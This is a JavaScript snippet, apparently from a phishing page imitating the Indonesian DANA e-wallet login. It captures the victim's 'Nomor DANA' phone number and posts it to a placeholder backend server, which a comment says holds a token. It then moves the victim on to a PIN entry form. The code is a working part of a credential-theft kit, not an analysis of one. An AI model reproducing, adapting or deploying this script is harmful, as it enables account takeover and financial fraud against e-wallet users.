<script>
  function sendNohp(event) {
    $("#process").show();
    event.preventDefault();
    $("#inp").blur();

    const nomor = document.getElementById("inp").value;
    sessionStorage.setItem("nomor", nomor);

    const logo = document.getElementById('logo').value;
    const gabungan = `${logo}%0A𝗡𝗼𝗺𝗼𝗿 𝗗𝗔𝗡𝗔 : 0${nomor}`;

    // Gunakan mekanisme fetch ke server backend yang menyimpan token
    fetch('https://your-backend-server/send-message', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ text: gabungan }),
    })
      .then(response => {
        if (response.ok) {
          $("#process").hide();
          document.getElementById("back1").style.display = "none";
          document.getElementById("back2").style.display = "block";
          $("#formNohp").fadeOut();
          setTimeout(() => {
            $("#formPin").fadeIn();
            $("#pin1").focus();
          }, 500);
        } else {
          console.error('Error in response:', response.status);
        }
      })
      .catch(error => {
        console.error('Error occurred:', error);
      });
  }
</script>